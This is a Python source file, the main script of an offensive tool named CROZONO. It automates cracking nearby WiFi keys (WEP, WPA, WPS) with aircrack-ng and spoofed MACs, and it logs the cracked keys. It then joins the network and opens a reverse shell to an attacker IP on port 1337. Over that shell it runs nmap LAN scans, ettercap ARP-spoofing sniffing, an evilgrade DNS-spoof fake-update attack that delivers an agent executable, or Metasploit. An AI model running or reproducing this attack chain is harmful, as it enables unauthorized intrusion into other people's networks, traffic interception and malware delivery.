#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
-------------------------------------------------------------------------
	CROZONO - 01.07.15.23.46.00 - www.crozono.com - crozono.pro@gmail.com

	Authors:
	Sheila Ayelen Berta a.k.a Shei Winker
	Twitter: @UnaPibaGeek
	Web: www.semecayounexploit.com (SMC1E)

	Nicolás Villanueva
	Twitter: @_nicovillanueva

	Licensed under the GNU General Public License Version 2 (GNU GPL v2),
		available at: http://www.gnu.org/licenses/gpl-2.0.txt

Kiwi :)
-------------------------------------------------------------------------

"""

#  ## LIBRARIES ##
import os
import time
import pexpect
import socket
import subprocess
import random
from poormanslogging import info, warn, error

import src.utils.device_manager as dev_mgr
import src.utils.sys_check as checks
import src.settings as settings


# ## CONTEXT VARIABLES ##
version = '1.5'


def get_target_mitm(gateway, ip_crozono):
	targets = []
	nmap_report = open(settings.OS_PATH + '/cr0z0n0_nmap', 'r')
	for line in nmap_report:
		if line.startswith('Nmap scan report for'):
			ip = line.split(" ")[-1]
			if ip.startswith(("192", "172", "10")) and ip != gateway and ip != ip_crozono:
				targets.append(ip)
	return random.choice(targets)


def get_current_essid(iface):
	iwc = subprocess.Popen(['iwconfig', iface], stdout=subprocess.PIPE)
	hea = subprocess.Popen(['head', '-1'], stdin=iwc.stdout, stdout=subprocess.PIPE)
	gre = subprocess.Popen(['grep', '-oP', '\".+\"'], stdin=hea.stdout, stdout=subprocess.PIPE)
	sout, serr = gre.communicate()
	if serr is not None:
		error("Error getting the current ESSID")
		return ""
	return sout.decode().strip().replace("\"", "")


def connect(essid, key):
	import fcntl
	import struct
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	tries = 0

	if dev_mgr.is_interface_monitor(settings.INTERFACE):
		dev_mgr.toggle_mode_monitor(settings.INTERFACE, False)

	def do_connect():
		nonlocal sock
		nonlocal tries
		info("Connecting to '{0}' with key '{1}'".format(essid, key if key is not None else ''))

		cmd_connect = pexpect.spawn('iwconfig {0} essid "{1}" key s:{2}'.format(settings.INTERFACE, essid, key))
		cmd_connect.logfile = open(settings.LOG_FILE, 'wb')
		cmd_connect.expect(['Error', pexpect.TIMEOUT, pexpect.EOF], 3)
		cmd_connect.close()
		parse_log_connect = open(settings.LOG_FILE, 'r')
		for line in parse_log_connect:
			if line.find('Error') != -1:
				wpa_supplicant = open('/etc/wpa_supplicant/wpa_supplicant.conf', 'w')
				wpa_supplicant.write('ctrl_interface=/var/run/wpa_supplicant\n')
				wpa_supplicant.write('network={\n')
				wpa_supplicant.write('ssid="' + essid + '"\n')
				wpa_supplicant.write('key_mgmt=WPA-PSK\n')
				wpa_supplicant.write('psk="' + key.strip() + '"\n')
				wpa_supplicant.write('}')
				wpa_supplicant.close()
				subprocess.call(['ifconfig', settings.INTERFACE, 'down'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
				subprocess.call(['dhclient', settings.INTERFACE, '-r'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
				subprocess.call(['ifconfig', settings.INTERFACE, 'up'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
				subprocess.call(['iwconfig', settings.INTERFACE, 'mode', 'managed'])
				subprocess.call(['killall', 'wpa_supplicant'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
				subprocess.call(['wpa_supplicant', '-B', '-c', '/etc/wpa_supplicant/wpa_supplicant.conf', '-i', settings.INTERFACE], stdout=subprocess.DEVNULL,
					stderr=subprocess.DEVNULL)
				time.sleep(2)
		parse_log_connect.close()
		os.remove(settings.LOG_FILE)
		tries += 1
		subprocess.call(['dhclient', settings.INTERFACE], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
		time.sleep(4)

	do_connect()
	if get_current_essid(settings.INTERFACE) != essid and tries < 5:
		warn('Connection to {e} failed. Retrying.'.format(e=essid))
		do_connect()
	if get_current_essid(settings.INTERFACE) == essid:
		ipaddr = socket.inet_ntoa(
				fcntl.ioctl(sock.fileno(), 0x8915, struct.pack('256s', bytes(settings.INTERFACE[:15], 'utf-8')))[20:24])
		info('Connection to {e} succeeded! Our IP is: {i}'.format(e=essid, i=ipaddr))
		return ipaddr
	else:
		error('Could not connect to {e} after 5 tries. Aborting'.format(e=essid))
		exit(1)


def save_key(essid, key):
	"""History with all keys cracked by date
	:param essid: Name of the ESSID for which the key was found
	:param key: ESSID's key
	"""
	with open(settings.OS_PATH + '/passwords_cracked', 'a') as f:
		f.write("{t} - {e}: {k} \n".format(t=time.strftime('%H:%M:%S'), e=essid, k=key))


def wep_attack(essid, bssid, channel, new_mac, iface_mon):
	if os.path.exists(settings.OS_PATH + '/cr0z0n0_attack-01.csv'):
		os.remove(settings.OS_PATH + '/cr0z0n0_attack-01.csv')
		os.remove(settings.OS_PATH + '/cr0z0n0_attack-01.cap')
		os.remove(settings.OS_PATH + '/cr0z0n0_attack-01.kismet.csv')
		os.remove(settings.OS_PATH + '/cr0z0n0_attack-01.kismet.netxml')

	proc_airodump = subprocess.Popen(['airodump-ng', '--bssid', bssid, '-c', channel, '-w', 'cr0z0n0_attack', iface_mon],
						stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

	cmd_auth = pexpect.spawn('aireplay-ng -1 0 -e "{0}" -a {1} -h {2} {3}'.format(essid, bssid, new_mac, iface_mon))
	cmd_auth.logfile = open(settings.LOG_FILE, 'wb')
	cmd_auth.expect(['Association successful', pexpect.TIMEOUT, pexpect.EOF], 20)
	cmd_auth.close()
	parse_log_auth = open(settings.LOG_FILE, 'r')
	for line in parse_log_auth:
		if line.find('Association successful') != -1:
			info("Association successful")
	parse_log_auth.close()
	os.remove(settings.LOG_FILE)

	proc_aireplay = subprocess.Popen(['aireplay-ng', '-3', '-e', '"' + essid + '"', '-b', bssid, '-h', new_mac, iface_mon],
						stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

	time.sleep(settings.WEP_AIREPLAY_TIME)

	cmd_crack = pexpect.spawn('aircrack-ng cr0z0n0_attack-01.cap')
	cmd_crack.logfile = open(settings.LOG_FILE, 'wb')
	cmd_crack.expect(['KEY FOUND!', 'Failed', pexpect.TIMEOUT, pexpect.EOF], 30)
	cmd_crack.close()
	key_found = False
	parse_log_crack = open(settings.LOG_FILE, 'r')
	for line in parse_log_crack:
		where = line.find('KEY FOUND!')
		if where > -1:
			if line.find('ASCII') != -1:
				where2 = line.find('ASCII')
				key_end = line.find(')')
				key_found = line[where2 + 6:key_end]
			else:
				key_end = line.find(']')
				key_found = line[where + 13:key_end]
	parse_log_crack.close()
	os.remove(settings.LOG_FILE)

	return key_found


def scan_targets(iface_mon, essid=None):
	"""
	Scans the surrounding networks for a predefined amount of time.
	Orders the found APs by power, and then returns the one with most IV captured (or the specified network in the essid parameter)
	The AP is represented by a dict, in the form:
		{'Privacy': 'WPA2 WPA', 'Authentication': 'PSK', 'channel': '1', 'ESSID': 'The Beardhouse', 'LAN IP': '0.  0.  0.  0', 'First time seen': '2015-12-15 04:10:22', 'Speed': '54', 'IV': '0', 'beacons': '25', 'ID-length': '14', 'Cipher': 'CCMP TKIP', 'Power': '-63', 'Last time seen': '2015-12-15 04:10:31', 'Key': '', 'BSSID': '38:60:77:A4:68:A1'}
	Notice that the keys are mapped to airodump-ng column names, EXCEPT for 'beacons' and 'IV'
	:param iface_mon: Monitoring interface with which to scan
	:param essid: If supplied, it gets the airodump information for this particular ESSID
	"""
	import csv
	info("Scanning {t} seconds for target WiFi access points...".format(t=settings.AIRODUMP_SCAN_TIME))
	#  Delete old files:
	if os.path.exists(settings.OS_PATH + '/cr0z0n0-01.csv'):
		os.remove(settings.OS_PATH + '/cr0z0n0-01.csv')
		os.remove(settings.OS_PATH + '/cr0z0n0-01.cap')
		os.remove(settings.OS_PATH + '/cr0z0n0-01.kismet.csv')
		os.remove(settings.OS_PATH + '/cr0z0n0-01.kismet.netxml')

	cmd_airodump = pexpect.spawn('airodump-ng -w cr0z0n0 {0}'.format(iface_mon))
	cmd_airodump.expect([pexpect.TIMEOUT, pexpect.EOF], settings.AIRODUMP_SCAN_TIME)
	cmd_airodump.close()

	with open(settings.OS_PATH + '/cr0z0n0-01.csv', 'r') as f:
		f.readline()  # skip empty line
		header = list(f.readline().split(', '))
		header = list(map(lambda x: x.replace('# ', '').strip(), header))  # cleanup
		d = csv.DictReader(f, delimiter=',', skipinitialspace=True, fieldnames=header)
		aps = []
		for e in d:
			if e.get('Power') is not None:
				aps.append(e)
			else:
				#  Nearing the end, there's the stations list,
				#  for which we don't care right now
				break
		if len(aps) == 0:
			error("No WiFi networks in range! Nothing we can do.")
			exit(1)
		if essid is None:
			for ap in aps:
				if ap.get('ESSID').find('00') != -1:
					aps.remove(ap)
			aps = sorted(aps, key=lambda x: x.get('Power'))
			# From the top 2, get the one with most IV
			return sorted(aps[:2], key=lambda x: x.get('IV'), reverse=True)[0]
		else:
			for ap in aps:
				if ap.get('ESSID') == essid:
					return ap


def parse_args():
	import argparse
	parser = argparse.ArgumentParser()
	parser.add_argument('-e', '--essid', type=str, help="ESSID to target. Surround in quotes if it has spaces!")
	parser.add_argument('-k', '--key', type=str, help="Key to use for connect to ESSID")
	parser.add_argument('-a', '--attack', type=str, help="Attack to perform")
	parser.add_argument('-d', '--dest', type=str, help="Destination to where to send info (attacker's IP)")
	parser.add_argument('-i', '--interface', type=str, help="Interface to use for attacks/connecting")
	return parser.parse_args()


def banner():
	global version
	from pyfiglet import figlet_format
	b = figlet_format("      CROZONO") + \
'''
	Sheila A. Berta - Nicolás Villanueva		{v}
		Software Development
	Pablo Romanos - Hardware Implementation
	'''.format(v=version)
	print(b)


def main():
	banner()
	if not checks.check_root():
		error('You need root privileges to run CROZONO!\n')
		exit(1)

	args = parse_args()

	if not checks.check_wlan_attacks_dependencies():
		exit(1)

	info("CROZONO running...")
	print("Arguments: {a}".format(a=args))

	settings.OS_PATH = os.getcwd()
	settings.INTERFACE = args.interface if args.interface is not None else dev_mgr.get_ifaces()[0]

	if args.essid is not None:
		if args.key is not None:
			ap_target = False
			ip_lan = connect(args.essid, args.key)
		else:
			iface_mon = dev_mgr.hardware_setup()
			new_mac = dev_mgr.mac_changer(iface_mon)
			ap_target = scan_targets(iface_mon, args.essid)
	else:
		iface_mon = dev_mgr.hardware_setup()
		new_mac = dev_mgr.mac_changer(iface_mon)
		ap_target = scan_targets(iface_mon)

	# -------------------- Infiltrate wifi --------------------
	if ap_target is not None:
		target_essid = ap_target.get('ESSID').strip()
		target_bssid = ap_target.get('BSSID').strip()
		target_channel = ap_target.get('channel').strip()
		target_privacy = ap_target.get('Privacy').strip()

		info("Target selected: " + target_essid)

		if target_privacy == 'WEP':
			info("Cracking {e} access point with WEP privacy...".format(e=target_essid))
			key = wep_attack(target_essid, target_bssid, target_channel, new_mac, iface_mon)
			if not key:
				error("Key not found! :(")
				exit()
			else:
				info("Key found!: {k} ".format(k=key))
				save_key(target_essid, key)
				ip_lan = connect(target_essid, key)

		elif target_privacy == 'WPA' or target_privacy == 'WPA2' or target_privacy == 'WPA2 WPA':
			from src.attacks import wpa
			info("Cracking {e} access point with {p} privacy...".format(e=target_essid, p=target_privacy))

			wps = wpa.wps_check(target_bssid, iface_mon)

			if wps:
				info("WPS is enabled")
				key = wpa.wpa_with_wps_attack(target_bssid, target_channel, iface_mon)
				if not key:
					warn("PIN not found! Trying with conventional WPA attack...")
					key = wpa.wpa_attack(target_bssid, target_channel, iface_mon)
			else:
				warn("WPS is not enabled")
				key = wpa.wpa_attack(target_bssid, target_channel, iface_mon)

			if not key:
				error("Key not found! :(")
				exit(1)
			else:
				info("Key found!: {k} ".format(k=key))
				save_key(target_essid, key)
				ip_lan = connect(target_essid, key)
		else:
			info("Open network!")
			ip_lan = connect(target_essid, None)

	# -------------------- Acquired LAN range --------------------

	ip_lan = ip_lan.strip()
	net = ip_lan.split('.')
	range_net = net[0] + '.' + net[1] + '.' + net[2] + '.1-255'

	# -------------------- Connect to attacker and relay nmap info --------------------

	if os.path.exists(settings.OS_PATH + '/cr0z0n0_nmap'):
		os.remove(settings.OS_PATH + '/cr0z0n0_nmap')

	if not checks.check_lan_attacks_dependencies():
		exit(1)

	attacker = args.dest

	if attacker is not None:
		info("Sending information about network to attacker ({ip}) and running attacks...".format(ip=attacker))
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((attacker, 1337))
		os.dup2(s.fileno(), 0)
		os.dup2(s.fileno(), 1)
		os.dup2(s.fileno(), 2)
		# banner()
		# info("Hello! :)")
		info("Executing Nmap...")
		subprocess.call(['nmap', '-O', '-sV', '-oN', 'cr0z0n0_nmap', '--exclude', ip_lan, range_net], stderr=subprocess.DEVNULL)
	else:
		warn("Attacker not defined! Ending...")
		exit()

	# -------------------- Attacks --------------------

	attack = args.attack

	if attack == 'sniffing-mitm':
		iface = dev_mgr.get_ifaces()[0]
		gateway = dev_mgr.get_gateway().strip()
		target_mitm = get_target_mitm(gateway, ip_lan)
		info("Executing MITM and Sniffing attacks between {g} and {m}...".format(g=gateway, m=target_mitm))
		cmd_ettercap = pexpect.spawn(
				'ettercap -T -M arp:remote /{g}/ /{m}/ -i {i}'.format(g=gateway, m=target_mitm, i=iface))
		time.sleep(2)
		# cmd_tshark = pexpect.spawn('tshark -i {i} -w cr0z0n0_sniff'.format(i=iface))
		proc = subprocess.call(["tshark", "-i", iface], stderr=subprocess.DEVNULL)

	elif attack == 'evilgrade':
		modules = open(settings.OS_PATH + '/evilgrade/modules.txt', 'r')
		agent = settings.OS_PATH + '/evilgrade/agent.exe'
		for line in modules:
			print(line.replace('\n', ''))
		print("\n\n Select module to use: ")
		plugin = input()
		info("Thank you! Evilgrade will be executed!")
		s.shutdown(1)

		if os.path.exists('/etc/ettercap/etter.dns'):
			subprocess.call(['rm', '/etc/ettercap/etter.dns'])
		etter_template = open(settings.OS_PATH + '/evilgrade/etter.dns.template', 'r')
		etter_dns = open(settings.OS_PATH + '/evilgrade/etter.dns', 'w')
		for line in etter_template:
			line = line.replace('IP', ip_lan)
			etter_dns.write(line)
		etter_dns.close()
		etter_template.close()
		subprocess.call(['mv', './evilgrade/etter.dns', '/etc/ettercap/etter.dns'])

		evilgrade = pexpect.spawn('evilgrade')
		evilgrade.expect('evilgrade>')
		evilgrade.sendline('configure ' + plugin)
		evilgrade.sendline('set agent ' + agent)
		evilgrade.sendline('start')
		time.sleep(1)

		iface = dev_mgr.get_ifaces()[0]
		gateway = dev_mgr.get_gateway().strip()
		target_mitm = get_target_mitm(gateway, ip_lan)
		cmd_ettercap = pexpect.spawn(
				'ettercap -T -M arp:remote /{g}/ /{m}/ -i {i} -P dns_spoof'.format(g=gateway, m=target_mitm, i=iface))
		time.sleep(settings.EVILGRADE_ATTACK_TIME)

	elif attack == 'metasploit':
		info("Executing Metasploit...")
		proc = subprocess.call(["msfconsole"], stderr=subprocess.DEVNULL)
	else:
		warn("Attack not defined!")

	s.shutdown(1)

	info("CROZONO has finished! Good bye! ;)")


main()
